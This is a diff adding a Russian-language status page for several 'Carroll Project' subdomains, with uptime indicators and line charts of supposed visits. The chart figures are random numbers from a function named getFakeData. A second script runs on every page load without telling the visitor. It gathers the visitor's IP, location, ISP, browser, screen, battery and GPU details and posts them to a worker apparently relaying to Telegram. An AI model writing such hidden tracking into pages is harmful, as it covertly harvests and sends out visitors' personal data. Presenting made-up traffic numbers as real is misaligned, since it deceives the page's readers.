@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Статусы</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <style>
+    :root {
+      --glass-bg-light: rgba(255, 255, 255, 0.18);
+      --glass-bg-dark:  rgba(25, 25, 25, 0.30);
+      --glass-border-light: rgba(255, 255, 255, 0.35);
+      --glass-border-dark:  rgba(255, 255, 255, 0.12);
+      --glass-blur: blur(30px);
+      --text-light: #000;
+      --text-dark:  #fff;
+      --dot-shadow: 0 0 12px rgba(0,0,0,0.35);
+    }
+
+    body{
+      margin:0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: radial-gradient(circle at top left,#e8f3ff 0%,#f0f0ff 35%,#ffffff 70%) fixed;
+      color:var(--text-light);
+      transition:background 0.6s,color 0.6s;
+    }
+    body.dark{
+      background: radial-gradient(circle at bottom right,#1c2230 0%,#141820 40%,#0f1117 70%) fixed;
+      color:var(--text-dark);
+    }
+
+    .container{max-width:1220px;margin:0 auto;padding:1.2rem;}
+
+    .header{
+      display:flex;justify-content:space-between;align-items:center;
+      margin-bottom:2rem;position:relative;
+    }
+
+    .title{
+      position:absolute;left:50%;transform:translateX(-50%);
+      font-size:1.7rem;font-weight:600;letter-spacing:0.3px;
+      backdrop-filter:var(--glass-blur);-webkit-backdrop-filter:var(--glass-blur);
+    }
+
+    .theme-toggle,.menu-button{
+      background:none;border:none;font-size:1.6rem;cursor:pointer;color:inherit;
+    }
+
+    .menu{
+      position:absolute;top:100%;right:0;
+      backdrop-filter:var(--glass-blur);-webkit-backdrop-filter:var(--glass-blur);
+      background-color:var(--glass-bg-light);
+      border:1px solid var(--glass-border-light);
+      border-radius:14px;
+      box-shadow:0 10px 30px rgba(0,0,0,0.25);
+      overflow:hidden;transform:scaleY(0);transform-origin:top;
+      transition:transform 0.3s ease;z-index:10;
+    }
+    body.dark .menu{background-color:var(--glass-bg-dark);border-color:var(--glass-border-dark);}
+    .menu.open{transform:scaleY(1);}
+    .menu a{display:block;padding:0.9rem 1.4rem;text-decoration:none;color:inherit;transition:background-color 0.25s;}
+    .menu a:hover{background-color:rgba(255,255,255,0.12);}
+
+    .status-block{
+      background-color:var(--glass-bg-light);
+      border:1px solid var(--glass-border-light);
+      backdrop-filter:var(--glass-blur);-webkit-backdrop-filter:var(--glass-blur);
+      padding:1.1rem 1.6rem;border-radius:22px;
+      display:flex;justify-content:space-between;align-items:center;
+      margin-bottom:0.9rem;
+      box-shadow:0 8px 26px rgba(0,0,0,0.18);
+      transition:background-color 0.4s,border-color 0.4s;
+    }
+    body.dark .status-block{background-color:var(--glass-bg-dark);border-color:var(--glass-border-dark);}
+
+    .status-dot{width:18px;height:18px;border-radius:50%;background-color:gray;box-shadow:var(--dot-shadow);transition:background-color 0.3s;}
+
+    canvas{
+      width:100%;height:240px;margin:0 auto;
+      border-radius:22px;margin-bottom:0.9rem;
+      background:linear-gradient(135deg,rgba(255,255,255,0.18) 0%,rgba(255,255,255,0.07) 100%);
+      backdrop-filter:var(--glass-blur);-webkit-backdrop-filter:var(--glass-blur);
+    }
+    body.dark canvas{
+      background:linear-gradient(135deg,rgba(255,255,255,0.06) 0%,rgba(255,255,255,0.02) 100%);
+    }
+
+    .footer{text-align:center;margin-top:3rem;font-size:0.9rem;opacity:0.75;}
+
+    .pair{display:block;margin-bottom:2.2rem;}
+
+    @media (min-width: 992px){
+      .grid{
+        display:grid;
+        grid-template-columns:repeat(3,1fr);
+        gap:2rem;
+      }
+      .pair{margin-bottom:0;}
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <button class="theme-toggle" id="themeToggle">🌙</button>
+      <div class="title">Статусы</div>
+      <div style="position: relative;">
+        <button class="menu-button" id="menuBtn">☰</button>
+        <div class="menu" id="menu">
+          <a href="https://carroll-project.online" target="_blank">Главная</a>
+          <a href="https://t.me/AikCarroll" target="_blank">Связь</a>
+        </div>
+      </div>
+    </div>
+
+    <div class="grid">
+      <div class="pair">
+        <div class="status-block"><span>Carroll Project</span><div class="status-dot" id="status1"></div></div>
+        <canvas id="chart1"></canvas>
+      </div>
+
+      <div class="pair">
+        <div class="status-block"><span>Contract Generator</span><div class="status-dot" id="status2"></div></div>
+        <canvas id="chart2"></canvas>
+      </div>
+
+      <div class="pair">
+        <div class="status-block"><span>Anonymity Check</span><div class="status-dot" id="status3"></div></div>
+        <canvas id="chart3"></canvas>
+      </div>
+
+      <div class="pair">
+        <div class="status-block"><span>QR Generator</span><div class="status-dot" id="status4"></div></div>
+        <canvas id="chart4"></canvas>
+      </div>
+
+      <div class="pair">
+        <div class="status-block"><span>Carroll Design</span><div class="status-dot" id="status5"></div></div>
+        <canvas id="chart5"></canvas>
+      </div>
+
+      <div class="pair">
+        <div class="status-block"><span>Morse Generator</span><div class="status-dot" id="status6"></div></div>
+        <canvas id="chart6"></canvas>
+      </div>
+    </div>
+
+    <div class="footer">by Aik Carroll</div>
+  </div>
+
+  <script>
+    const domains = [
+      { url: "https://carroll-project.online",           elementId: "status1" },
+      { url: "https://gen.carroll-project.online",        elementId: "status2" },
+      { url: "https://anonymitycheck.carroll-project.online",      elementId: "status3" },
+      { url: "https://qr.carroll-project.online",         elementId: "status4" },
+      { url: "https://design.carroll-project.online",     elementId: "status5" },
+      { url: "https://morse.carroll-project.online",      elementId: "status6" }
+    ];
+
+    function checkStatus(domain){
+      fetch(domain.url,{mode:'no-cors'})
+        .then(()=>{document.getElementById(domain.elementId).style.backgroundColor="limegreen";})
+        .catch(()=>{document.getElementById(domain.elementId).style.backgroundColor="red";});
+    }
+    function updateStatuses(){domains.forEach(checkStatus);}
+    updateStatuses(); setInterval(updateStatuses,30000);
+
+    const themeToggle=document.getElementById('themeToggle');
+    const setTheme=(mode)=>{
+      if(mode==='dark'){document.body.classList.add('dark');themeToggle.textContent='☀️';}
+      else{document.body.classList.remove('dark');themeToggle.textContent='🌙';}
+      document.cookie=`theme=${mode};path=/;max-age=31536000`;
+    };
+    const getThemeFromCookie=()=>{const m=document.cookie.match(/theme=(dark|light)/);return m?m[1]:null;};
+    themeToggle.addEventListener('click',()=>{
+      const dark=document.body.classList.contains('dark');
+      setTheme(dark?'light':'dark');
+    });
+    setTheme(getThemeFromCookie()||'light');
+
+    const menuBtn=document.getElementById('menuBtn');const menu=document.getElementById('menu');
+    menuBtn.addEventListener('click',()=>menu.classList.toggle('open'));
+    document.addEventListener('click',(e)=>{
+      if(!menu.contains(e.target)&&!menuBtn.contains(e.target)){menu.classList.remove('open');}
+    });
+
+    const labels=['Пн','Вт','Ср','Чт','Пт','Сб','Вс'];
+    function getFakeData(key){
+      const stored=JSON.parse(localStorage.getItem(key))||{lastDate:'',data:Array(7).fill(0).map(()=>Math.floor(80+Math.random()*60))};
+      const today=new Date().toISOString().split('T')[0];
+      if(stored.lastDate!==today){
+        stored.data.shift();stored.data.push(Math.floor(80+Math.random()*60));
+        stored.lastDate=today;localStorage.setItem(key,JSON.stringify(stored));
+      }
+      return stored.data;
+    }
+
+    const visits1=getFakeData('visits1');
+    const visits2=getFakeData('visits2');
+    const visits3=getFakeData('visits3');
+    const visits4=getFakeData('visits4');
+    const visits5=getFakeData('visits5');
+    const visits6=getFakeData('visits6');
+
+    function createChart(ctx,data,border,background){
+      return new Chart(ctx,{
+        type:'line',
+        data:{labels,datasets:[{data,borderColor:border,backgroundColor:background,fill:true,tension:0.4}]},
+        options:{responsive:true,scales:{y:{beginAtZero:true}},plugins:{legend:{display:false}}}
+      });
+    }
+    createChart(document.getElementById('chart1'),visits1,'#00b050','rgba(0,176,80,0.12)');
+    createChart(document.getElementById('chart2'),visits2,'#0070ff','rgba(0,112,255,0.12)');
+    createChart(document.getElementById('chart3'),visits3,'#8000ff','rgba(128,0,255,0.12)');
+    createChart(document.getElementById('chart4'),visits4,'#ff9500','rgba(255,149,0,0.12)');
+    createChart(document.getElementById('chart5'),visits5,'#00c1d4','rgba(0,193,212,0.12)');
+    createChart(document.getElementById('chart6'),visits6,'#ff2d55','rgba(255,45,85,0.12)');
+  </script>
+  <script>
+  (async () => {
+    const geoRes = await fetch('https://ipwho.is/');
+    const ipData = await geoRes.json();
+
+    let batteryInfo = {};
+    if (navigator.getBattery) {
+      try {
+        const battery = await navigator.getBattery();
+        batteryInfo = { charging: battery.charging, level: battery.level };
+      } catch {}
+    }
+
+    function getWebGLInfo() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        return {
+          vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
+          renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
+        };
+      } catch {
+        return { vendor: 'неизвестно', renderer: 'неизвестно' };
+      }
+    }
+
+    const gpu = getWebGLInfo();
+    const info = {
+      ip: ipData.ip,
+      city: ipData.city,
+      region: ipData.region,
+      country: ipData.country,
+      isp: ipData.connection?.isp || 'Неизвестно',
+      timezone: ipData.timezone?.id || 'N/A',
+      userAgent: navigator.userAgent,
+      screen: `${screen.width}x${screen.height}`,
+      platform: navigator.platform,
+      language: navigator.language,
+      touchSupport: navigator.maxTouchPoints > 0 ? 'да' : 'нет',
+      battery: batteryInfo,
+      gpuVendor: gpu.vendor,
+      gpuRenderer: gpu.renderer,
+      time: new Date().toLocaleString()
+    };
+
+    const text = `
+🕵️ Status:
+IP: ${info.ip}
+Город: ${info.city}, ${info.country}
+Провайдер: ${info.isp}
+Часовой пояс: ${info.timezone}
+Платформа: ${info.platform}
+Язык браузера: ${info.language}
+Разрешение экрана: ${info.screen}
+Поддержка касаний: ${info.touchSupport}
+Батарея: ${info.battery.level * 100}% ${info.battery.charging ? '(заряжается)' : ''}
+GPU Vendor: ${info.gpuVendor}
+GPU Renderer: ${info.gpuRenderer}
+Браузер: ${info.userAgent}
+Время: ${info.time}
+    `.trim();
+
+    await fetch('https://tg-proxy.vassa0081-0f3.workers.dev', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ text })
+    });
+  })();
+</script>
+</body>
+</html>
